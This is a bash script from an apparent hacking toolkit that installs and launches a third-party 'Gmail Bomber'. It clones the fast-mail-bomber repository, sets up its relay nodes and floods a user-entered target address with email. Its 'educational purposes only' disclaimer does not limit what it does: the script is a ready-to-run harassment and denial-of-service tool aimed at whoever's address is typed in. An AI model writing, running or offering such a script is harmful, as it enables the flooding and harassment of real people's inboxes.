#!/bin/bash

# ALHacking Gmail Bomber
# Email bombing tool (Educational purposes only)

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source logger
source "$SCRIPT_DIR/logger.sh"

TOOLS_DIR="$PROJECT_ROOT/Tools"
TOOL_DIR="$TOOLS_DIR/fast-mail-bomber"

print_banner "Gmail Bomber"
echo ""
log_warning "⚠️  Use this tool responsibly and only on accounts you own!"
echo ""

# Check for PHP
if ! command -v php >/dev/null 2>&1; then
    log_error "PHP is not installed!"
    log_info "Install PHP: pkg install php -y (Termux) or apt install php -y (Linux)"
    exit 1
fi

# Create Tools directory if it doesn't exist
mkdir -p "$TOOLS_DIR"

# Check if tool is already installed
if [ ! -d "$TOOL_DIR" ]; then
    log_info "Installing fast-mail-bomber... This may take a moment."
    cd "$TOOLS_DIR"
    git clone https://github.com/juzeon/fast-mail-bomber.git
    
    if [ $? -ne 0 ]; then
        log_error "Failed to clone fast-mail-bomber"
        exit 1
    fi
    
    cd "$TOOL_DIR"
    mv config.example.php config.php 2>/dev/null || true
    
    log_info "Updating providers..."
    php index.php update-providers
    rm -rf data/nodes.json data/dead_providers.json 2>/dev/null || true
    
    log_info "This may take a long time. Press Ctrl+C to cancel."
    php index.php update-nodes
    php index.php refine-nodes
fi

cd "$TOOL_DIR"
echo ""
read -p "Enter email address to target: " email

if [ -z "$email" ]; then
    log_error "Email address is required"
    exit 1
fi

log_info "Starting email bombing on $email..."
php index.php start-bombing "$email"
